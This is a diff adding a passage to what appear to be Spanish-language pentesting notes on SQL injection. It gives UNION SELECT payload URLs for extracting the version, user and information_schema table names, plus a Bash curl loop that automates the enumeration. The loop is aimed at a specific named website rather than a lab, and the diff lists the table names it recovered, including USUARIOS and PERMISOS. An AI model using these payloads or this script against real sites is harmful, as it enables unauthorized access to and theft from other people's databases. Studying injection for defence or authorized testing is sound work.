@@ -953,6 +953,35 @@ Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visuali
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -`
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -`
 
+Comenzamos a enumerar las tablas de la base de datos:
+
+`http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -`
+
+Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma rápida qué tablas existen sobre la base de datos, parseando para ello los resultados en función del caso que se nos presente:
+
+```bash
+for i in $(seq 1 200); do
+    echo -n "Para el número $i: "
+    curl --silent "http://www.aquariumlanzarote.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-" | grep "eltitulo" | cut -d '>' -f 2 | awk '{print $1}' FS="<"
+done
+```
+
+Obtendremos resultados como los siguientes:
+
+```bash
+Para el número 63: CABECERA
+Para el número 64: COLABORADORES
+Para el número 65: CONTENIDOS
+Para el número 66: DOCUMENTOS
+Para el número 67: HORARIOS
+Para el número 68: IDIOMAS
+Para el número 69: IMAGENES
+Para el número 70: MODULOS
+Para el número 71: NOTICIAS
+Para el número 72: PERMISOS
+Para el número 73: USUARIOS
+```
+
 ### Pentesting Linux
 
 ### Pentesting Windows
